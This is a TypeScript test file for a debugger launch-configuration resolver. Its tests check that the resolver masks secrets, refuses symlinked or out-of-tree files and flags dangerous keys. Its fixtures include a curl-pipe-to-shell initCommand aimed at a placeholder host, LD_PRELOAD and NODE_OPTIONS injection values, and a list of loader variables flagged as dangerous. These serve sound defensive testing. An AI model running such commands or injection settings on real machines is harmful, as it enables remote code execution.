import { chmodSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import {
  defaultConfigForFile,
  languageIdForFile,
  listLaunchConfigs,
  parseLaunchJson,
  resolveLaunchSpec,
  type ResolveLaunchSpecInput
} from './launch-config'
import { launchConfigHash, substituteLaunchVariables } from './launch-config-variables'

const roots: string[] = []

afterEach(() => {
  for (const root of roots.splice(0)) {
    rmSync(root, { recursive: true, force: true })
  }
})

function tempDir(): string {
  const dir = mkdtempSync(join(tmpdir(), 'orca-launch-config-'))
  roots.push(dir)
  return dir
}

function worktreeWith(launchJson?: string): string {
  const root = tempDir()
  if (launchJson !== undefined) {
    mkdirSync(join(root, '.vscode'))
    writeFileSync(join(root, '.vscode', 'launch.json'), launchJson)
  }
  return root
}

function launchJson(...configurations: object[]): string {
  return JSON.stringify({ version: '0.2.0', configurations })
}

// No PATH and an empty home, so no real adapter binary on this machine leaks into a result.
const NO_ADAPTERS = { pathEnv: '', homePath: '/nonexistent-orca-home', env: {} }

async function resolveOk(input: ResolveLaunchSpecInput) {
  const result = await resolveLaunchSpec({ adapterOptions: NO_ADAPTERS, ...input })
  if (!result.ok) {
    throw new Error(`expected a spec, got ${result.reason}: ${result.message}`)
  }
  return result.spec
}

describe('launch.json reading', () => {
  it('parses comments and trailing commas', () => {
    const result = parseLaunchJson(`{
      // a line comment with "quotes" and http://urls
      "configurations": [
        /* block */ { "name": "A", "type": "go", "program": "//not-a-comment", },
      ],
    }`)
    expect(result).toEqual({
      ok: true,
      file: {
        configurations: [{ name: 'A', type: 'go', program: '//not-a-comment' }],
        compounds: []
      }
    })
  })

  it('refuses a malformed file with line:column and never falls back to a default', async () => {
    const root = worktreeWith('{\n  "configurations": [\n    { "name": "A",, }\n  ]\n}')
    const listed = await listLaunchConfigs(root)
    expect(listed).toMatchObject({ ok: false, reason: 'malformed' })
    expect(!listed.ok && listed.message).toContain('3:19')
    const spec = await resolveLaunchSpec({
      worktreePath: root,
      configName: 'A',
      filePath: join(root, 'a.py')
    })
    expect(spec).toMatchObject({ ok: false, reason: 'malformed' })
    // The current-file default STOPS too: a stray comma must not read as "launch.json ignored".
    const fallback = await resolveLaunchSpec({ worktreePath: root, filePath: join(root, 'a.py') })
    expect(fallback).toMatchObject({ ok: false, reason: 'malformed' })
    expect(!fallback.ok && fallback.message).toContain('3:19')
  })

  it.skipIf(process.platform === 'win32')(
    'refuses a launch.json that is a symlink or over 1 MiB, without reading it',
    async () => {
      const linked = worktreeWith()
      mkdirSync(join(linked, '.vscode'))
      symlinkSync('/dev/zero', join(linked, '.vscode', 'launch.json'))
      expect(await listLaunchConfigs(linked)).toMatchObject({ ok: false, reason: 'malformed' })
      const huge = worktreeWith(`{"configurations": []}${' '.repeat(1024 * 1024)}`)
      expect(await listLaunchConfigs(huge)).toMatchObject({ ok: false, reason: 'malformed' })
    }
  )

  it('drops __proto__, constructor and prototype keys, so the hash and the behaviour agree', async () => {
    const root = worktreeWith(
      '{"configurations": [{"name": "P", "type": "debugpy", "program": "a.py",' +
        ' "__proto__": {"request": "attach"}, "constructor": "x", "env": {"prototype": "y"}}]}'
    )
    const spec = await resolveOk({ worktreePath: root, configName: 'P' })
    expect(spec.request).toBe('launch')
    expect(Object.getPrototypeOf(spec.resolved)).toBe(Object.prototype)
    expect(Object.keys(spec.resolved)).not.toContain('constructor')
    expect(spec.resolved.env).toEqual({})
  })

  it('treats a missing launch.json as no configurations', async () => {
    expect(await listLaunchConfigs(worktreeWith())).toEqual({ ok: true, configs: [] })
  })

  it('lists configurations, refusing a compound and an unknown type by name', async () => {
    const root = worktreeWith(
      JSON.stringify({
        configurations: [
          { name: 'Py', type: 'python', request: 'launch' },
          { name: 'Ruby', type: 'rdbg', request: 'launch' },
          { name: 'Pick', type: 'node', request: 'attach', processId: '${command:pickProcess}' }
        ],
        compounds: [{ name: 'Both', configurations: ['Py', 'Ruby'] }]
      })
    )
    const listed = await listLaunchConfigs(root)
    expect(listed.ok && listed.configs).toEqual([
      expect.objectContaining({ name: 'Py', type: 'python', adapterId: 'debugpy', runnable: true }),
      expect.objectContaining({ name: 'Ruby', adapterId: null, runnable: false }),
      expect.objectContaining({ name: 'Pick', adapterId: 'js-debug', runnable: false }),
      {
        name: 'Both',
        kind: 'compound',
        type: '',
        request: '',
        adapterId: null,
        runnable: false,
        refusal: 'compound configurations are not supported'
      }
    ])
    expect(listed.ok && listed.configs[1].refusal).toContain('"rdbg"')
    expect(listed.ok && listed.configs[2].refusal).toContain('${command:pickProcess}')
    expect(await resolveLaunchSpec({ worktreePath: root, configName: 'Both' })).toMatchObject({
      ok: false,
      reason: 'compound'
    })
    const unknown = await resolveLaunchSpec({ worktreePath: root, configName: 'Ruby' })
    expect(unknown).toMatchObject({ ok: false, reason: 'unknown-type' })
    expect(!unknown.ok && unknown.message).toContain('rdbg')
  })
})

describe('variable substitution', () => {
  const worktreePath = '/proj/site'
  const filePath = '/proj/site/src/app.test.js'
  const ctx = {
    worktreePath,
    filePath,
    lineNumber: 42,
    cwd: '/start',
    env: { ORCA_LAUNCH: 'from-env' },
    platform: 'linux' as const
  }

  it.each([
    ['${workspaceFolder}', '/proj/site'],
    ['${workspaceFolderBasename}', 'site'],
    ['${file}', filePath],
    ['${fileBasename}', 'app.test.js'],
    ['${fileBasenameNoExtension}', 'app.test'],
    ['${fileDirname}', '/proj/site/src'],
    ['${fileExtname}', '.js'],
    ['${relativeFile}', 'src/app.test.js'],
    ['${relativeFileDirname}', 'src'],
    ['${cwd}', '/start'],
    ['${pathSeparator}', '/'],
    ['${lineNumber}', '42'],
    ['${env:ORCA_LAUNCH}', 'from-env'],
    ['${env:ORCA_UNSET}', ''],
    ['${workspaceFolder}/dist/**/*.js', '/proj/site/dist/**/*.js'],
    ['${someFutureThing}', '${someFutureThing}'],
    ['cost is ${100', 'cost is ${100']
  ])('%s', (input, expected) => {
    expect(substituteLaunchVariables({ v: input }, ctx)).toEqual({
      ok: true,
      value: { v: expected }
    })
  })

  it('recurses through arrays and objects and leaves other values alone', () => {
    const result = substituteLaunchVariables(
      { args: ['${file}', 3, true, null], env: { ROOT: '${workspaceFolder}' }, port: 9229 },
      ctx
    )
    expect(result).toEqual({
      ok: true,
      value: { args: [filePath, 3, true, null], env: { ROOT: '/proj/site' }, port: 9229 }
    })
  })

  it.each([
    '${command:pickProcess}',
    '${input:envName}',
    '${config:python.defaultInterpreterPath}'
  ])('refuses %s by name instead of expanding it to an empty string', (variable) => {
    const result = substituteLaunchVariables({ args: ['--x', `pre-${variable}`] }, ctx)
    expect(result).toMatchObject({
      ok: false,
      reason: 'unsupported-variable',
      variables: [variable]
    })
    expect(!result.ok && result.message).toContain(variable)
  })

  it.each([
    '${file}',
    '${fileBasename}',
    '${fileDirname}',
    '${fileBasenameNoExtension}',
    '${fileExtname}',
    '${relativeFile}',
    '${relativeFileDirname}',
    '${lineNumber}'
  ])('refuses %s with no file as needs-file', (variable) => {
    const result = substituteLaunchVariables({ program: variable }, { worktreePath })
    expect(result).toMatchObject({ ok: false, reason: 'needs-file', variables: [variable] })
    expect(!result.ok && result.message).toContain(variable)
  })
})

describe('current-file defaults', () => {
  it('gives the python, node and go templates and refuses others', () => {
    expect(defaultConfigForFile('python')).toEqual({
      ok: true,
      config: {
        type: 'debugpy',
        request: 'launch',
        name: 'Python: current file',
        program: '${file}',
        cwd: '${workspaceFolder}',
        console: 'internalConsole',
        justMyCode: false
      }
    })
    for (const languageId of ['javascript', 'typescript']) {
      expect(defaultConfigForFile(languageId)).toMatchObject({
        ok: true,
        config: { type: 'node', request: 'launch', program: '${file}', cwd: '${workspaceFolder}' }
      })
    }
    expect(defaultConfigForFile('go')).toMatchObject({
      ok: true,
      config: { type: 'go', request: 'launch', mode: 'debug', program: '${fileDirname}' }
    })
    expect(defaultConfigForFile('ruby')).toMatchObject({ ok: false, reason: 'no-default' })
  })

  it('derives the language from the extension when languageId is omitted', async () => {
    expect(languageIdForFile('/a/b.PY')).toBe('python')
    expect(languageIdForFile('/a/b.tsx')).toBe('typescriptreact')
    const root = worktreeWith()
    const spec = await resolveOk({ worktreePath: root, filePath: join(root, 'pkg', 'main.go') })
    expect(spec.adapterId).toBe('dlv')
    expect(spec.config).toMatchObject({ program: join(root, 'pkg'), outputMode: 'remote' })
  })

  it('refuses a default needing a file when none was given', async () => {
    const root = worktreeWith()
    expect(await resolveLaunchSpec({ worktreePath: root, languageId: 'python' })).toMatchObject({
      ok: false,
      reason: 'needs-file'
    })
    expect(await resolveLaunchSpec({ worktreePath: root })).toMatchObject({ reason: 'needs-file' })
  })
})

describe('resolveLaunchSpec', () => {
  it('merges defaults, then user keys, then the forced type, folder key and program', async () => {
    const root = worktreeWith(
      launchJson(
        { name: 'Py', type: 'python', request: 'launch', justMyCode: true },
        { name: 'Node', type: 'node', request: 'launch' }
      )
    )
    const file = join(root, 'src', 'main.py')
    const py = await resolveOk({ worktreePath: root, configName: 'Py', filePath: file })
    // User justMyCode beats the row default; type forced to the wire type; program injected from the file.
    expect(py.config).toEqual({
      justMyCode: true,
      console: 'internalConsole',
      name: 'Py',
      type: 'debugpy',
      request: 'launch',
      program: file
    })
    expect(py.config).not.toHaveProperty('__workspaceFolder')
    const node = await resolveOk({ worktreePath: root, configName: 'Node', filePath: file })
    expect(node.config).toMatchObject({ type: 'pwa-node', __workspaceFolder: root, program: file })
    const forged = worktreeWith(
      launchJson({ name: 'N', type: 'node', request: 'launch', __workspaceFolder: '/attacker' })
    )
    const overridden = await resolveOk({ worktreePath: forged, configName: 'N', filePath: file })
    expect(overridden.config.__workspaceFolder).toBe(forged)
    expect(node.adapterId).toBe('js-debug')
  })

  it('keeps a program the configuration named and injects none into attach', async () => {
    const root = worktreeWith(
      launchJson(
        {
          name: 'Explicit',
          type: 'debugpy',
          request: 'launch',
          program: '${workspaceFolder}/x.py'
        },
        { name: 'Attach', type: 'go', request: 'attach', mode: 'local', processId: 1234 }
      )
    )
    const filePath = join(root, 'main.py')
    const explicit = await resolveOk({ worktreePath: root, configName: 'Explicit', filePath })
    expect(explicit.config.program).toBe(`${root}/x.py`)
    const attach = await resolveOk({ worktreePath: root, configName: 'Attach', filePath })
    expect(attach.request).toBe('attach')
    expect(attach.config).not.toHaveProperty('program')
    expect(attach.runs.processId).toBe(1234)
  })

  it('forces a terminal console to internalConsole and records it', async () => {
    const root = worktreeWith(
      launchJson(
        {
          name: 'Term',
          type: 'debugpy',
          request: 'launch',
          program: 'a.py',
          console: 'integratedTerminal'
        },
        {
          name: 'Ext',
          type: 'node',
          request: 'launch',
          program: 'a.js',
          console: 'externalTerminal'
        }
      )
    )
    const term = await resolveOk({ worktreePath: root, configName: 'Term' })
    expect(term.config.console).toBe('internalConsole')
    expect(term.consoleForcedFrom).toBe('integratedTerminal')
    expect(term.resolved.console).toBe('integratedTerminal')
    const ext = await resolveOk({ worktreePath: root, configName: 'Ext' })
    expect(ext.consoleForcedFrom).toBe('externalTerminal')
    const plain = await resolveOk({
      worktreePath: root,
      languageId: 'python',
      filePath: join(root, 'a.py')
    })
    expect(plain).not.toHaveProperty('consoleForcedFrom')
  })

  it('hashes the unresolved configuration: one hash across worktrees and files, new on any edit', async () => {
    const entry = {
      name: 'Py',
      type: 'python',
      request: 'launch',
      program: '${file}',
      args: ['-v']
    }
    const a = worktreeWith(launchJson(entry))
    const b = worktreeWith(launchJson(entry))
    const first = await resolveOk({
      worktreePath: a,
      configName: 'Py',
      filePath: join(a, 'one.py')
    })
    const second = await resolveOk({
      worktreePath: b,
      configName: 'Py',
      filePath: join(b, 'two.py')
    })
    expect(first.configHash).toMatch(/^[0-9a-f]{64}$/)
    expect(second.configHash).toBe(first.configHash)
    expect(first.resolved.program).not.toBe(second.resolved.program)
    const reordered = {
      args: ['-v'],
      program: '${file}',
      request: 'launch',
      type: 'python',
      name: 'Py'
    }
    expect(launchConfigHash('debugpy', reordered)).toBe(first.configHash)
    expect(launchConfigHash('debugpy', { ...entry, args: ['-vv'] })).not.toBe(first.configHash)
    expect(launchConfigHash('dlv', entry)).not.toBe(first.configHash)
    const defaults = await Promise.all(
      [a, b].map((root) => resolveOk({ worktreePath: root, filePath: join(root, 'x.py') }))
    )
    expect(defaults[0].configHash).toBe(defaults[1].configHash)
  })

  it('refuses unsupported and needs-file variables by name', async () => {
    const root = worktreeWith(
      launchJson(
        { name: 'Ask', type: 'go', request: 'launch', args: ['${input:envName}'] },
        { name: 'Cur', type: 'go', request: 'launch', program: '${fileDirname}' }
      )
    )
    const ask = await resolveLaunchSpec({ worktreePath: root, configName: 'Ask' })
    expect(ask).toMatchObject({ ok: false, reason: 'unsupported-variable' })
    expect(!ask.ok && ask.message).toContain('${input:envName}')
    const cur = await resolveLaunchSpec({ worktreePath: root, configName: 'Cur' })
    expect(cur).toMatchObject({ ok: false, reason: 'needs-file' })
    expect(!cur.ok && cur.message).toContain('${fileDirname}')
  })

  it('describes what runs, masking secrets and flagging loader variables', async () => {
    const env = {
      API_KEY: 'k',
      GITHUB_TOKEN: 't',
      DB_PASSWORD: 'p',
      NODE_OPTIONS: '--require x',
      LD_PRELOAD: 'evil.so',
      PLAIN: 'visible'
    }
    const root = worktreeWith(
      launchJson({
        name: 'N',
        type: 'node',
        request: 'launch',
        program: 'a.js',
        args: ['--x'],
        env
      })
    )
    const { runs } = await resolveOk({ worktreePath: root, configName: 'N' })
    expect(runs).toMatchObject({
      program: 'a.js',
      args: ['--x'],
      module: null,
      port: null,
      adapterBinary: null
    })
    expect(runs.env).toEqual([
      { name: 'API_KEY', value: '••••••', masked: true, dangerous: false },
      { name: 'GITHUB_TOKEN', value: '••••••', masked: true, dangerous: false },
      { name: 'DB_PASSWORD', value: '••••••', masked: true, dangerous: false },
      { name: 'NODE_OPTIONS', value: '--require x', masked: false, dangerous: true },
      { name: 'LD_PRELOAD', value: 'evil.so', masked: false, dangerous: true },
      { name: 'PLAIN', value: 'visible', masked: false, dangerous: false }
    ])
  })

  it('flags every loader variable as dangerous, and a nearby benign key not', async () => {
    const dangerous = [
      'NODE_OPTIONS',
      'PYTHONPATH',
      'PYTHONSTARTUP',
      'LD_PRELOAD',
      'DYLD_INSERT_LIBRARIES',
      'DYLD_LIBRARY_PATH'
    ]
    const env = Object.fromEntries([...dangerous, 'PYTHONUNBUFFERED'].map((k) => [k, 'v']))
    const root = worktreeWith(launchJson({ name: 'N', type: 'node', request: 'launch', env }))
    const { runs } = await resolveOk({ worktreePath: root, configName: 'N' })
    expect(Object.fromEntries(runs.env.map((e) => [e.name, e.dangerous]))).toEqual({
      ...Object.fromEntries(dangerous.map((k) => [k, true])),
      PYTHONUNBUFFERED: false
    })
  })

  it('shows ${env:NAME} as written in the preview, while the wire config resolves it', async () => {
    const root = worktreeWith(
      launchJson({
        name: 'N',
        type: 'node',
        request: 'launch',
        args: ['${env:ORCA_TEST_SECRET}'],
        env: { X: '${env:ORCA_TEST_SECRET}' }
      })
    )
    const spec = await resolveOk({
      worktreePath: root,
      configName: 'N',
      env: { ORCA_TEST_SECRET: 'hunter2' }
    })
    expect(spec.config.args).toEqual(['hunter2'])
    expect(spec.runs.args).toEqual(['${env:ORCA_TEST_SECRET}'])
    expect(spec.runs.env).toEqual([
      { name: 'X', value: '${env:ORCA_TEST_SECRET}', masked: false, dangerous: false }
    ])
    expect(JSON.stringify(spec.runs)).not.toContain('hunter2')
  })

  it('shows and flags every key the adapter receives, including initCommands', async () => {
    const root = worktreeWith(
      launchJson({
        name: 'Attach',
        type: 'lldb-dap',
        request: 'attach',
        pid: 1234,
        initCommands: ['platform shell curl https://x.example/p | sh'],
        buildFlags: '-toolexec=x',
        env: { API_KEY: 'secret' }
      })
    )
    const { runs } = await resolveOk({ worktreePath: root, configName: 'Attach' })
    const keys = Object.fromEntries(runs.allKeys.map((k) => [k.name, k]))
    const names = runs.allKeys.map((k) => k.name)
    expect(names).toEqual([...names].sort())
    expect(keys.initCommands).toEqual({
      name: 'initCommands',
      value: '["platform shell curl https://x.example/p | sh"]',
      dangerous: true
    })
    expect(keys.buildFlags.dangerous).toBe(true)
    expect(keys.pid).toEqual({ name: 'pid', value: '1234', dangerous: false })
    expect(keys.env.value).toBe('{"API_KEY":"••••••"}')
    expect(JSON.stringify(runs)).not.toContain('secret')
    const node = worktreeWith(launchJson({ name: 'N', type: 'node', request: 'launch' }))
    const nodeRuns = (await resolveOk({ worktreePath: node, configName: 'N' })).runs
    expect(nodeRuns.allKeys.map((k) => k.name)).not.toContain('__workspaceFolder')
  })

  it('refuses preLaunchTask and postDebugTask by name', async () => {
    const root = worktreeWith(
      launchJson(
        { name: 'Pre', type: 'node', request: 'launch', preLaunchTask: 'build' },
        { name: 'Post', type: 'node', request: 'launch', postDebugTask: 'clean' }
      )
    )
    for (const configName of ['Pre', 'Post']) {
      const result = await resolveLaunchSpec({ worktreePath: root, configName })
      expect(result).toMatchObject({ ok: false, reason: 'unsupported-request' })
      expect(!result.ok && result.message).toContain('tasks are not supported')
    }
    const listed = await listLaunchConfigs(root)
    expect(listed.ok && listed.configs.every((c) => !c.runnable)).toBe(true)
  })

  it('shows envFile entries masked and hashes its text, so an edit needs a new confirmation', async () => {
    const root = worktreeWith(
      launchJson({ name: 'N', type: 'node', request: 'launch', envFile: '${workspaceFolder}/.env' })
    )
    writeFileSync(join(root, '.env'), '# comment\nexport API_TOKEN="t"\nPLAIN=v\n')
    const first = await resolveOk({ worktreePath: root, configName: 'N' })
    expect(first.runs.envFileEntries).toEqual([
      { name: 'API_TOKEN', value: '••••••', masked: true, dangerous: false },
      { name: 'PLAIN', value: 'v', masked: false, dangerous: false }
    ])
    writeFileSync(join(root, '.env'), 'NODE_OPTIONS=--require ./x.js\n')
    const edited = await resolveOk({ worktreePath: root, configName: 'N' })
    expect(edited.configHash).not.toBe(first.configHash)
    expect(edited.runs.envFileEntries).toEqual([
      { name: 'NODE_OPTIONS', value: '--require ./x.js', masked: false, dangerous: true }
    ])
  })

  it('refuses an envFile outside the worktree, a symlink, a missing or an oversized one', async () => {
    const outside = tempDir()
    writeFileSync(join(outside, 'x.env'), 'A=1\n')
    const root = worktreeWith(
      launchJson(
        { name: 'Out', type: 'node', request: 'launch', envFile: join(outside, 'x.env') },
        { name: 'Dots', type: 'node', request: 'launch', envFile: '../x.env' },
        { name: 'Link', type: 'node', request: 'launch', envFile: 'link.env' },
        { name: 'Gone', type: 'node', request: 'launch', envFile: 'gone.env' },
        { name: 'Big', type: 'node', request: 'launch', envFile: 'big.env' }
      )
    )
    // Windows CI runners often lack the privilege to create symlinks; the other four
    // refusals still run there.
    const canLink = process.platform !== 'win32'
    if (canLink) {
      symlinkSync(join(outside, 'x.env'), join(root, 'link.env'))
    }
    writeFileSync(join(root, 'big.env'), `A=${'x'.repeat(64 * 1024)}\n`)
    for (const configName of ['Out', 'Dots', ...(canLink ? ['Link'] : []), 'Gone', 'Big']) {
      const result = await resolveLaunchSpec({ worktreePath: root, configName })
      expect(result, configName).toMatchObject({ ok: false, reason: 'malformed' })
    }
  })

  it.skipIf(process.platform === 'win32')('names the adapter binary that will run', async () => {
    const bin = tempDir()
    writeFileSync(join(bin, 'dlv'), '#!/bin/sh\n')
    chmodSync(join(bin, 'dlv'), 0o755)
    const root = worktreeWith()
    const spec = await resolveOk({
      worktreePath: root,
      filePath: join(root, 'main.go'),
      adapterOptions: { ...NO_ADAPTERS, pathEnv: bin }
    })
    expect(spec.runs.adapterBinary).toBe(join(bin, 'dlv'))
    expect(spec.runs.adapterArgs).toEqual(['dap', '--listen', 'unix:<socket>'])
  })
})
